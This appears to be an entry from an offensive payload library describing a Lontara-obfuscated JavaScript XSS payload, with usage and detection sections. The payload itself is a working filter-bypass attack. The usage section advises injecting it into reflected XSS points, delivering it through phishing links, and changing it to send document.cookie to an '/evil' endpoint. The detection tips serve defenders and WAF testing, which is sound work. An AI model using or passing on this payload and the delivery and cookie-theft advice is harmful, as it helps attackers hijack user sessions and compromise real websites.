---
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.939273+00:00'
updated_at: '2023-04-10T20:21:44.640835+00:00'
tags:
  - xss
  - obfuscation
  - filter-bypass
  - lontara
platforms:
  - Web
validated: true
---

# Lontara-Obfuscated-JavaScript-Payload

## Code

```javascript
ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()
```

## Description

This JavaScript code is obfuscated using the Lontara technique, employing Unicode characters from non-standard scripts to define variables and construct strings. It initializes empty strings and objects, then builds a function name (likely 'eval') through concatenation and invokes it with a constructed argument string (appearing as an empty alert or similar). The purpose is to execute arbitrary JS while evading filter detection in XSS scenarios, demonstrating proof-of-concept execution like popping an alert.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | The code is hardcoded with no substitutable variables; customize by modifying the concatenated string in a deobfuscated version before re-obfuscating. | N/A |

## Usage

Inject this payload into a reflected XSS vulnerability, such as a URL parameter or form input that echoes content unsanitized (e.g., ?q=<script>payload</script>). Use in red team engagements to test WAF bypasses or during pentests to validate XSS vectors. Deliver via phishing links or direct manipulation with tools like Burp Suite. Start a listener if extending to exfil (e.g., modify to fetch('/evil?cookie='+document.cookie)).

## Detection

- Scan for non-ASCII Unicode characters in input logs or JS sources using tools like grep with \p{So} (other symbols).
- Monitor browser execution for eval() calls via CSP reports or extended logging.
- Detect anomalous alert() or console.log() in client-side monitoring; use DOM sanitizers that normalize Unicode.
- WAF signatures for homoglyphs or unusual variable patterns in JS.

## Related

- [[procedures/Lontara-Filter-Bypass-for-Obfuscated-JavaScript-Execution]]
